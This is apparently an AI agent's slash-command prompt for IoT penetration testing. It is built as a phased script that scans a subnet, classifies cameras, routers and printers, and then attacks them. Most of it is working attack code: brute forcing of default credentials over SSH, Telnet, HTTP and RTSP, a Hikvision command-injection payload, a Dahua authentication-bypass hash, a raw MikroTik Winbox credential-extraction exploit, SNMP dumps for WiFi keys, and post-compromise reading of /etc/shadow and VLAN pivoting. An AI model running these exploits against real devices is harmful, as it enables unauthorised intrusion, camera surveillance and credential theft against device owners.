---
description: IoT/Camera/Router/Printer exploitation — device discovery via MAC OUI, port-based classification, RTSP stream access, brand-specific default credentials (Hikvision/Dahua/Axis/Cisco/TP-Link/MikroTik), known CVE exploitation, SNMP config dump, post-compromise pivot
argument-hint: <subnet|host> (e.g. 192.168.1.0/24 or 192.168.1.100)
allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-pentest__execute_parallel]
---

# pt-iot — IoT / Camera / Router / Printer Exploitation

You are an expert IoT and embedded device penetration tester. Discover and compromise every non-PC device on the network: IP cameras (Hikvision, Dahua, Axis, Hanwha), routers (Cisco, MikroTik, TP-Link, NETGEAR, Asus, D-Link), printers (HP, Canon, Epson), and other smart devices. Think like a human: "I see MAC OUI = Hikvision → port 8000 open → CVE-2021-36260 unauthenticated RCE → shell on camera → pivot to internal camera VLAN."

---

## Step 0 — Parse Arguments & Setup

`$ARGUMENTS` = `<subnet|host>`
- CIDR like `192.168.1.0/24` → scan full subnet
- Single IP like `192.168.1.100` → scan that host only

```bash
TARGET=<argument>
ENG=/home/kali/current
KALI_IP=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K[^ ]+' | head -1)
mkdir -p $ENG/{loot/{iot,rtsp,snmp},scans/iot,poc/requests} 2>/dev/null

echo "=== pt-iot — IoT/Camera/Device Exploitation ==="
echo "Target: $TARGET"
echo "Kali IP: $KALI_IP"
echo ""

# Check for routersploit
which rsf.py 2>/dev/null || which routersploit 2>/dev/null || {
    echo "[!] routersploit not installed — installing..."
    pip3 install routersploit 2>/dev/null || \
    git clone https://www.github.com/threat9/routersploit /opt/routersploit 2>/dev/null && \
    pip3 install -r /opt/routersploit/requirements.txt 2>/dev/null
}
RSF=$(which rsf.py 2>/dev/null || echo "python3 /opt/routersploit/rsf.py")
```

---

## Phase 1 — Device Discovery + Vendor Identification

Discover all devices and classify them by vendor via MAC OUI lookup:

```bash
TARGET=<target>
ENG=/home/kali/current

echo "=== [Phase 1] Device Discovery + Vendor Identification ==="
echo ""

# ARP scan with MAC vendor lookup
echo "--- ARP scan with OUI vendor lookup ---"
arp-scan "$TARGET" --localnet 2>/dev/null | \
    grep -E "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | \
    tee $ENG/scans/iot/arp_devices.txt | \
    awk '{printf "  %-18s %-20s %s\n", $1, $2, $3}' | head -50

echo ""
echo "--- Classifying devices by vendor OUI ---"
python3 << 'EOF'
import subprocess

vendors = {
    'hikvision': ['00:0d:c0', 'bc:ad:28', '2c:69:ba', '44:19:b6', 'c4:02:8a', 'a4:14:37', '28:57:be', '5c:f4:ab'],
    'dahua': ['90:02:a9', 'e0:50:8b', '4c:11:bf', 'a4:02:b9', '00:12:34', '10:12:fb'],
    'axis': ['00:40:8c', 'ac:cc:8e', 'b8:a4:4f', '00:e0:4d'],
    'cisco': ['00:1a:a1', '00:0b:be', '00:1b:54', 'e8:4d:d0', '00:90:7f', '34:db:fd'],
    'mikrotik': ['e4:8d:8c', 'd4:ca:6d', '00:0c:42', 'b8:69:f4', '48:8f:5a', '18:fd:74', 'cc:2d:e0'],
    'ubiquiti': ['00:27:22', '04:18:d6', '24:a4:3c', 'dc:9f:db', 'f4:92:bf', '78:8a:20', '00:15:6d'],
    'netgear': ['00:09:5b', '00:0f:b5', '00:14:6c', '00:18:4d', '20:0c:c8', 'a0:21:b7', 'c4:04:15'],
    'tplink': ['00:1d:0f', '14:cc:20', '1c:7e:e5', '50:c7:bf', '98:de:d0', 'ac:84:c6', 'b0:48:7a'],
    'asus': ['00:0c:6e', '00:11:2f', '10:bf:48', '14:dd:a9', '2c:56:dc', '38:d5:47', '50:46:5d'],
    'dlink': ['00:0f:3d', '00:11:95', '00:13:46', '00:15:e9', '00:17:9a', '00:19:5b', '00:1c:f0'],
    'hanwha': ['00:09:18', '00:09:09', '20:a6:0c', 'b8:4a:ba'],
}

try:
    with open('/home/kali/current/scans/iot/arp_devices.txt', 'r') as f:
        lines = f.readlines()

    print("  Device Classification:")
    print(f"  {'IP':<18} {'MAC':<20} {'Vendor':<15} {'Type'}")
    print(f"  {'-'*18} {'-'*20} {'-'*15} {'-'*20}")

    for line in lines:
        parts = line.strip().split('\t')
        if len(parts) < 2:
            parts = line.strip().split()
        if len(parts) < 2:
            continue

        ip = parts[0] if parts else '?'
        mac = parts[1].lower() if len(parts) > 1 else '?'
        vendor_raw = ' '.join(parts[2:]) if len(parts) > 2 else 'Unknown'

        # OUI classification
        oui = mac[:8] if len(mac) >= 8 else ''
        device_type = 'Unknown'
        for vendor, ouis in vendors.items():
            if any(oui.startswith(o) for o in ouis):
                device_type = f"[{vendor.upper()}]"
                break

        # Keyword classification from vendor string
        vl = vendor_raw.lower()
        if 'hikvision' in vl or 'hangzhou' in vl: device_type = '[HIKVISION CAMERA]'
        elif 'dahua' in vl: device_type = '[DAHUA CAMERA]'
        elif 'axis' in vl: device_type = '[AXIS CAMERA]'
        elif 'hanwha' in vl or 'samsung' in vl: device_type = '[HANWHA/SAMSUNG CAMERA]'
        elif 'cisco' in vl: device_type = '[CISCO NETWORK]'
        elif 'mikrotik' in vl: device_type = '[MIKROTIK ROUTER]'
        elif 'ubiquiti' in vl: device_type = '[UBIQUITI]'
        elif 'netgear' in vl: device_type = '[NETGEAR ROUTER]'
        elif 'tp-link' in vl or 'tplink' in vl: device_type = '[TP-LINK ROUTER]'
        elif 'asus' in vl: device_type = '[ASUS ROUTER]'
        elif 'd-link' in vl or 'dlink' in vl: device_type = '[D-LINK ROUTER]'
        elif 'hewlett' in vl or 'hp ' in vl: device_type = '[HP PRINTER]'
        elif 'canon' in vl: device_type = '[CANON PRINTER]'
        elif 'epson' in vl: device_type = '[EPSON PRINTER]'
        elif 'apple' in vl: device_type = '[APPLE DEVICE]'
        elif 'intel' in vl or 'microsoft' in vl or 'vmware' in vl: device_type = '[PC/VM]'

        print(f"  {ip:<18} {mac:<20} {vendor_raw[:15]:<15} {device_type}")

except Exception as e:
    print(f"  Error: {e}")
EOF
```

---

## Phase 2 — Port-Based Device Classification

Identify device types from their port signatures:

```bash
TARGET=<target>
ENG=/home/kali/current

echo ""
echo "=== [Phase 2] Port-Based Device Classification ==="
echo ""

# Scan for IoT-specific ports
echo "Running targeted port scan for IoT signatures..."
nmap -sV -T4 --open -Pn \
    -p 21,22,23,25,53,80,161,443,554,3389,5900,8080,8443,8888,9090,\
8000,8001,8081,9527,37777,37778,49152,5000,5001,5002,6000,7070,\
9100,515,631,9000,4443,2000,8161,10000 \
    "$TARGET" \
    -oN $ENG/scans/iot/iot_ports.txt 2>/dev/null

echo ""
echo "--- Device classification by port signature ---"
python3 << 'EOF'
import re

try:
    with open('/home/kali/current/scans/iot/iot_ports.txt', 'r') as f:
        content = f.read()

    # Parse host blocks
    current_host = None
    host_ports = {}

    for line in content.split('\n'):
        host_match = re.search(r'Nmap scan report for (.+)', line)
        if host_match:
            current_host = host_match.group(1).split()[-1].strip('()')
            host_ports[current_host] = []
        elif current_host and '/tcp' in line and 'open' in line:
            port = line.split('/')[0].strip()
            service = line.split()[-1] if len(line.split()) > 2 else '?'
            host_ports[current_host].append((int(port), service))

    # Device signature rules
    SIGNATURES = {
        'IP Camera (Hikvision)': lambda p: 8000 in p or (80 in p and 554 in p and 8000 in p),
        'IP Camera (Dahua)': lambda p: 37777 in p or 9527 in p or (37778 in p),
        'IP Camera (RTSP)': lambda p: 554 in p or 8554 in p,
        'Router/Firewall': lambda p: 23 in p and (80 in p or 443 in p) and 22 in p,
        'Router (MikroTik)': lambda p: 8291 in p or (21 in p and 22 in p and 23 in p and 8080 in p),
        'Router (Ubiquiti)': lambda p: 8080 in p and 8443 in p and 22 in p,
        'Printer (JetDirect)': lambda p: 9100 in p,
        'Printer (IPP)': lambda p: 631 in p,
        'NVR/DVR': lambda p: 37777 in p and 554 in p,
        'Network Switch': lambda p: 23 in p and 161 in p and 80 in p,
        'Smart Device/IoT': lambda p: 5000 in p or 1883 in p or 8883 in p,
        'VoIP/PBX': lambda p: 5060 in p or 5061 in p,
    }

    for host, ports in host_ports.items():
        port_nums = [p[0] for p in ports]
        detected_types = [t for t, fn in SIGNATURES.items() if fn(port_nums)]
        if not detected_types:
            detected_types = ['Unknown device']

        print(f"\n  Host: {host}")
        print(f"  Open ports: {', '.join(map(str, sorted(port_nums)))}")
        print(f"  Device type: {' | '.join(detected_types)}")

        # Attack hints
        if 554 in port_nums or 37777 in port_nums or 8000 in port_nums:
            print(f"  [!] Camera detected → test RTSP stream + default creds + CVE-2021-36260")
        if 9100 in port_nums or 631 in port_nums:
            print(f"  [!] Printer detected → JetDirect raw print + config page at http://{host}/")
        if 23 in port_nums:
            print(f"  [!] Telnet open → default credentials very likely")
        if 161 in port_nums:
            print(f"  [!] SNMP open → full config dump likely available")
        if 8291 in port_nums:
            print(f"  [!] MikroTik Winbox → CVE-2018-14847 credential extraction")

except Exception as e:
    print(f"Error: {e}")
EOF
```

---

## Phase 3 — RTSP Stream Enumeration

Discover and access IP camera video streams:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 3] RTSP Stream Enumeration ==="
echo ""

# Extract hosts with RTSP/camera ports
CAMERA_HOSTS=$(grep -E "554/tcp.*open|37777/tcp.*open|8000/tcp.*open|8554/tcp.*open" \
    $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

# Common RTSP URI paths for popular camera brands
RTSP_PATHS=(
    # Generic
    "/live"
    "/stream"
    "/video"
    "/channel1"
    "/stream1"
    "/h264Preview_01_main"
    "/cam/realmonitor?channel=1&subtype=0"
    # Hikvision
    "/Streaming/Channels/101"
    "/Streaming/Channels/1"
    "/h264/ch1/main/av_stream"
    # Dahua
    "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=Onvif"
    "/live?channel=1&subtype=0"
    # Axis
    "/axis-media/media.amp"
    "/axis-cgi/mjpg/video.cgi"
    # Hanwha
    "/profile5/media.smp"
    "/live.sdp"
    # Generic variants
    "/0"
    "/1"
    "/h265Preview_01_main"
)

RTSP_CREDS=(
    "admin:admin"
    "admin:12345"
    "admin:password"
    "admin:"
    "root:root"
    "root:admin"
    "admin:Admin1234"
    "admin:1234"
    "user:user"
    "guest:guest"
    "ubnt:ubnt"
)

for host in $CAMERA_HOSTS; do
    echo "--- Testing RTSP on $host ---"

    # Try nmap rtsp brute first
    nmap --script rtsp-url-brute -p 554 "$host" 2>/dev/null | \
        grep -E "RTSP|rtsp://|url|path" | head -10

    # Manual RTSP URI testing
    for cred in "${RTSP_CREDS[@]}"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        for path in "${RTSP_PATHS[@]}"; do
            # Test with ffprobe (fast, non-streaming)
            result=$(timeout 5 ffprobe -v quiet -print_format json -show_streams \
                "rtsp://$user:$pass@$host:554$path" 2>&1 | head -3)
            if echo "$result" | grep -qE '"codec_type"|"width"'; then
                echo "  [RTSP STREAM FOUND] rtsp://$user:$pass@$host:554$path"
                echo "  Stream info: $(echo $result | head -c 100)"
                echo "  rtsp://$user:$pass@$host:554$path" >> $ENG/loot/rtsp/streams.txt
                break 2
            fi
        done
    done
    echo ""
done

echo "RTSP streams discovered → $ENG/loot/rtsp/streams.txt"
[ -s $ENG/loot/rtsp/streams.txt ] && cat $ENG/loot/rtsp/streams.txt || echo "(none found yet — try manual URIs)"
```

---

## Phase 4 — Default Credential Sweep (Brand-Specific)

Test brand-specific default credentials on every discovered device:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 4] Default Credential Testing ==="
echo ""

# Function to test HTTP login with curl
test_web_creds() {
    local host=$1
    local port=$2
    local user=$3
    local pass=$4
    local proto="${5:-http}"

    CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
        -u "$user:$pass" "$proto://$host:$port/" 2>/dev/null)
    [ "$CODE" = "200" ] && echo "    [+] $proto://$host:$port/ → $user:$pass (HTTP Basic Auth)" && return 0

    # Try common form-based login paths
    for path in /login /admin /web /cgi-bin/main-cgi /ISAPI/Security/userCheck; do
        CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
            -u "$user:$pass" "$proto://$host:$port$path" 2>/dev/null)
        [ "$CODE" = "200" ] && echo "    [+] $proto://$host$path → $user:$pass" && return 0
    done
    return 1
}

# Get all live IoT hosts
IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

for host in $IOT_HOSTS; do
    echo "--- $host ---"
    PORT_FILE=$(grep -A30 "$host" $ENG/scans/iot/iot_ports.txt 2>/dev/null | head -30)

    # SSH brute force
    if echo "$PORT_FILE" | grep -q "22/tcp.*open"; then
        echo "  Testing SSH default creds..."
        for cred in "admin:admin" "admin:password" "admin:1234" "root:root" "root:admin" \
                    "admin:Admin1234" "ubnt:ubnt" "admin:12345" "pi:raspberry" "cisco:cisco"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            result=$(timeout 5 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                -o BatchMode=no "$u@$host" "id" 2>/dev/null)
            [ -n "$result" ] && echo "  [SSH +] $u:$p → $result" && \
                echo "$host SSH $u:$p" >> $ENG/loot/iot/found_creds.txt
        done
    fi

    # Telnet brute force (very common on cameras/routers)
    if echo "$PORT_FILE" | grep -q "23/tcp.*open"; then
        echo "  Testing Telnet default creds..."
        for cred in "admin:admin" "admin:password" "admin:" "root:root" "root:" \
                    "admin:12345" "user:user" "cisco:cisco" "ubnt:ubnt"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            result=$(timeout 8 hydra -l "$u" -p "$p" -t 1 -f telnet://$host 2>/dev/null | \
                grep "login:")
            [ -n "$result" ] && echo "  [TELNET +] $u:$p" && \
                echo "$host TELNET $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done
    fi

    # Web admin panel (most cameras/routers)
    for port in 80 8080 443 8443 8888; do
        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
        proto="http"; [ "$port" = "443" ] || [ "$port" = "8443" ] && proto="https"

        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 4 "$proto://$host:$port/" 2>/dev/null)
        [ "$code" = "000" ] && continue

        echo "  Web admin on $proto://$host:$port/ (HTTP $code)"

        # Hikvision defaults
        for cred in "admin:12345" "admin:admin" "admin:Admin12345" "admin:"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Hikvision $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Dahua defaults
        for cred in "admin:admin" "admin:" "admin:password" "888888:888888" "666666:666666"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Dahua $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Router defaults
        for cred in "admin:admin" "admin:password" "admin:1234" "admin:" \
                    "admin:Admin1234" "root:root" "ubnt:ubnt" "cisco:cisco"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Router $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done
    done
    echo ""
done

echo "Found credentials → $ENG/loot/iot/found_creds.txt"
[ -s $ENG/loot/iot/found_creds.txt ] && cat $ENG/loot/iot/found_creds.txt
```

---

## Phase 5 — Known CVE Exploitation

Attempt brand-specific high-value CVEs:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 5] Known CVE Exploitation ==="
echo ""

IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

for host in $IOT_HOSTS; do
    PORT_FILE=$(grep -A40 "$host" $ENG/scans/iot/iot_ports.txt 2>/dev/null | head -40)

    # --- CVE-2021-36260: Hikvision Unauthenticated RCE ---
    if echo "$PORT_FILE" | grep -qE "80/tcp.*open|8080/tcp.*open|8000/tcp.*open"; then
        for port in 80 8080 8000 443; do
            echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue

            # Identify Hikvision by web fingerprint
            title=$(curl -sk --max-time 5 "http://$host:$port/" 2>/dev/null | \
                grep -oiP '(?<=<title>)[^<]+' | head -1)

            if echo "$title" | grep -qi "hik\|nvr\|dvr\|ipc\|ptz" || \
               curl -sk --max-time 5 "http://$host:$port/doc/page/login.asp" 2>/dev/null | \
               grep -qi "hikvision\|hik"; then

                echo "  [Hikvision detected] $host:$port — Testing CVE-2021-36260..."
                RESULT=$(curl -sk --max-time 10 \
                    -X PUT "http://$host:$port/SDK/webLanguage" \
                    -H "Content-Type: application/xml" \
                    --data '<?xml version="1.0" encoding="UTF-8"?><language>$(id > /tmp/CVE_2021_36260.txt)</language>' \
                    2>/dev/null)
                echo "  PUT response: $(echo $RESULT | head -c 200)"

                # Verify RCE
                sleep 2
                VERIFY=$(curl -sk --max-time 5 "http://$host:$port/SDK/webLanguage" 2>/dev/null)
                echo "  Verify: $(echo $VERIFY | head -c 100)"
                echo "$RESULT" | grep -qiv "error\|400\|401\|403\|404" && \
                    echo "  [!!!] CVE-2021-36260 may be exploitable on $host:$port" && \
                    echo "$host HTTP CVE-2021-36260 POTENTIAL" >> $ENG/loot/iot/cve_findings.txt
            fi
        done
    fi

    # --- CVE-2021-33044 / CVE-2021-33045: Dahua Authentication Bypass ---
    if echo "$PORT_FILE" | grep -qE "80/tcp.*open|8080/tcp.*open|37777/tcp.*open"; then
        for port in 80 8080; do
            title=$(curl -sk --max-time 5 "http://$host:$port/" 2>/dev/null | \
                grep -oiP '(?<=<title>)[^<]+' | head -1)

            if echo "$title" | grep -qi "dahua\|dss\|ivms\|nvr\|cam" || \
               curl -sk --max-time 5 "http://$host:$port/RPC2_Login" 2>/dev/null | grep -qi "dahua\|login"; then

                echo "  [Dahua detected] $host:$port — Testing CVE-2021-33044 auth bypass..."
                # Dahua magic hash: specific MD5 bypass
                MAGIC_HASH=$(python3 -c "
import hashlib
user = 'admin'
magic = hashlib.md5((user + ':6QNMIQGe').encode()).hexdigest().upper()
print(magic)
" 2>/dev/null)

                RESULT=$(curl -sk --max-time 8 "http://$host:$port/RPC2_Login" \
                    -X POST \
                    -H "Content-Type: application/json-rpc" \
                    --data "{\"method\":\"global.login\",\"params\":{\"userName\":\"admin\",\"password\":\"$MAGIC_HASH\",\"clientType\":\"Dahua3.0-Web3.0\"},\"id\":1,\"session\":0}" \
                    2>/dev/null)
                echo "  Auth bypass result: $(echo $RESULT | python3 -m json.tool 2>/dev/null | head -5)"
                echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); print('[AUTH BYPASSED]' if d.get('result') else 'failed')" 2>/dev/null && \
                    echo "$host HTTP Dahua-CVE-2021-33044-BYPASSED" >> $ENG/loot/iot/cve_findings.txt
            fi
        done
    fi

    # --- CVE-2018-14847: MikroTik Winbox Credential Extraction ---
    if echo "$PORT_FILE" | grep -q "8291/tcp.*open"; then
        echo "  [MikroTik Winbox] $host:8291 — Testing CVE-2018-14847..."
        python3 << PYEOF
import socket, sys

host = "$host"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, 8291))

    # CVE-2018-14847: read /flash/rw/store/user.dat without authentication
    # Winbox protocol message to request credential file
    msg = bytes([
        0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ])
    s.send(msg)
    data = s.recv(4096)
    if len(data) > 50:
        # Look for username/password strings in response
        text = data.decode('latin-1')
        print(f"  Response ({len(data)} bytes): checking for credentials...")
        # Credentials often appear as plaintext in response
        for i in range(len(data)-4):
            if data[i:i+4] == b'\x01\x00\x00\x21':
                ulen = data[i+4]
                username = data[i+5:i+5+ulen].decode('latin-1', errors='replace')
                print(f"  [CRED] Username: {username}")
        print(f"  Raw hex: {data[:80].hex()}")
    else:
        print(f"  Short response ({len(data)} bytes) — may not be vulnerable")
    s.close()
except Exception as e:
    print(f"  Error: {e}")
PYEOF
    fi

    # --- CVE-2017-5521: NETGEAR Password Recovery ---
    for port in 80 8080 443; do
        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
        title=$(curl -sk --max-time 5 "http://$host:$port/" 2>/dev/null | grep -oiP '(?<=<title>)[^<]+')
        if echo "$title" | grep -qi "netgear\|wnr\|r6\|r7\|r8"; then
            echo "  [NETGEAR detected] $host:$port — Testing CVE-2017-5521..."
            RESULT=$(curl -sk --max-time 5 "http://$host:$port/passwordrecovered.cgi?id=1" 2>/dev/null)
            echo "$RESULT" | grep -qi "password\|admin" && {
                echo "  [CVE-2017-5521 HIT] Password exposed:"
                echo "$RESULT" | grep -iE "password|admin|user" | head -5
                echo "$host NETGEAR CVE-2017-5521" >> $ENG/loot/iot/cve_findings.txt
            } || echo "  Not vulnerable"
        fi
    done

    # --- Printer exploitation ---
    if echo "$PORT_FILE" | grep -q "9100/tcp.*open"; then
        echo "  [Printer JetDirect] $host:9100 — Testing direct print access..."
        # Read printer config via PJL
        echo '@PJL INFO STATUS
@PJL INFO ID
@PJL FSQUERY FORMAT:"0:\\"
@PJL EOJ NAME="test"' | nc -w 5 $host 9100 2>/dev/null | head -10
    fi

done

echo ""
echo "CVE findings → $ENG/loot/iot/cve_findings.txt"
[ -s $ENG/loot/iot/cve_findings.txt ] && cat $ENG/loot/iot/cve_findings.txt || echo "(no CVEs confirmed)"
```

---

## Phase 6 — SNMP Full Config Dump

Extract complete device configuration via SNMP:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 6] SNMP Full Config Dump ==="
echo ""

SNMP_HOSTS=$(grep -E "161" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

[ -z "$SNMP_HOSTS" ] && {
    echo "No SNMP hosts detected in port scan. Running UDP SNMP discovery..."
    SNMP_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
        grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)
}

COMMUNITIES="public private community admin snmp cisco router switch camera"

for host in $SNMP_HOSTS; do
    echo "--- SNMP: $host ---"
    for community in $COMMUNITIES; do
        # Test if community string works
        RESULT=$(snmpwalk -v2c -c "$community" -t 3 "$host" sysDescr 2>/dev/null | head -1)
        if [ -n "$RESULT" ]; then
            echo "  [+] Community '$community' WORKS: $RESULT"

            # Full MIB dump
            echo "  Dumping full MIB..."
            snmpwalk -v2c -c "$community" "$host" 2>/dev/null | \
                tee $ENG/loot/snmp/snmp_${host//./_}_${community}.txt | wc -l | \
                xargs -I{} echo "  {} OID entries dumped"

            # Extract interesting fields
            echo "  Key info extracted:"
            snmpwalk -v2c -c "$community" "$host" 2>/dev/null | \
                grep -iE "sysName|sysLocation|sysContact|ifDescr|ipAdEntAddr|\
hrSWInstalledName|ssLoginUsers|wlanSsid|wepKey|wpaKey|passPhrase|\
printerMake|printerModel|firmware|version" | \
                head -30 | sed 's/^/    /'

            # Look for WiFi PSK (common in router SNMP MIBs)
            snmpwalk -v2c -c "$community" "$host" 2>/dev/null | \
                grep -iE "passphrase|wpa.*key|psk|password" | \
                head -10 | sed 's/^/    [WiFi] /'

            echo "$host SNMP $community" >> $ENG/loot/iot/found_creds.txt
            break  # Found working community, move to next host
        fi
    done
    echo ""
done
```

---

## Phase 7 — Routersploit Scan

Automated vulnerability scanning with routersploit:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 7] Routersploit Automated Scanning ==="
echo ""

IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u | head -10)

RSF=$(which rsf.py 2>/dev/null || echo "python3 /opt/routersploit/rsf.py")

for host in $IOT_HOSTS; do
    echo "--- Routersploit scan: $host ---"
    echo "use scanners/autopwn
set target $host
run
exit" | timeout 120 $RSF 2>/dev/null | \
    grep -E "Vulnerable|exploitable|\[+\]" | head -15
    echo ""
done
```

---

## Phase 8 — Post-Compromise

After successful compromise, escalate and pivot:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 8] Post-Compromise Actions ==="
echo ""

echo "--- If camera/router shell obtained ---"
cat << 'EOF'
# Identify the device
id; uname -a; cat /etc/os-release 2>/dev/null; cat /proc/version 2>/dev/null

# Network interfaces (find other VLANs)
ip addr; ip route; ifconfig -a 2>/dev/null

# Scan from device's perspective (pivot to camera VLAN)
# Install nmap if not present (or use /dev/tcp bash scan):
for ip in $(seq 1 254); do
    (ping -c1 -W1 192.168.200.$ip &>/dev/null && echo "LIVE: 192.168.200.$ip") &
done; wait

# Extract stored credentials from device
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | \
    xargs grep -il "password\|passwd\|secret" 2>/dev/null | head -10

# Backup device config
cat /etc/config/wireless 2>/dev/null  # OpenWRT WiFi PSK
cat /etc/passwd 2>/dev/null           # User accounts
cat /etc/shadow 2>/dev/null           # Password hashes
EOF

echo ""
echo "--- Hikvision shell: extract camera stream credentials ---"
cat << 'EOF'
# After CVE-2021-36260 RCE on Hikvision:
curl -sk http://<camera-ip>/ISAPI/Security/users -u admin:admin
curl -sk http://<camera-ip>/ISAPI/System/deviceInfo
# Factory backup (may contain plain-text PSK):
curl -sk http://<camera-ip>/ISAPI/System/configurationData -u admin:admin > /tmp/config.bak
EOF

# Show summary of all findings
echo ""
echo "=== IoT Engagement Summary ==="
echo ""
echo "Devices discovered: $(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | wc -l)"
echo "RTSP streams: $(wc -l < $ENG/loot/rtsp/streams.txt 2>/dev/null || echo 0)"
echo "Default creds found: $(wc -l < $ENG/loot/iot/found_creds.txt 2>/dev/null || echo 0)"
echo "CVEs exploited: $(wc -l < $ENG/loot/iot/cve_findings.txt 2>/dev/null || echo 0)"
echo ""
echo "Next steps:"
echo "  → Spray found credentials across subnet: /pt-exploit <subnet>"
echo "  → MITM all camera traffic: /pt-mitm <iface>"
echo "  → Scan camera VLAN from pivot: /pt-net <camera-vlan-subnet>"
echo "  → AD attacks if Windows hosts found: /pt-ad <domain> <dc-ip> <creds>"

# Update engagement notes
cat >> $ENG/notes/engagement.md << NOTES

---
## IoT/Camera Scan
**Date**: $(date)
**Devices found**: $(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | wc -l)
**RTSP streams**: $(wc -l < $ENG/loot/rtsp/streams.txt 2>/dev/null || echo 0)
**Credentials**: $(wc -l < $ENG/loot/iot/found_creds.txt 2>/dev/null || echo 0)
**CVE hits**: $(cat $ENG/loot/iot/cve_findings.txt 2>/dev/null | head -5)
NOTES
```

---

## Execution Rules

- **Always run Phase 1+2 together** — OUI + port classification gives the attack priority
- **RTSP first** (Phase 3) — a working RTSP stream is an instant deliverable in any report
- **CVEs before brute force** (Phase 5 before Phase 4) — CVE-2021-36260 needs no creds at all
- **SNMP is gold** — it can expose WiFi PSK, routing tables, VLANs — always try public/private
- **Routersploit** covers hundreds of router CVEs automatically — let it run
- **Post-compromise pivot** — cameras often sit on their own VLAN with access to other cameras; map it
- **Camera shells are noisy** — don't run loud scanners from camera; use passive discovery (ping sweep)
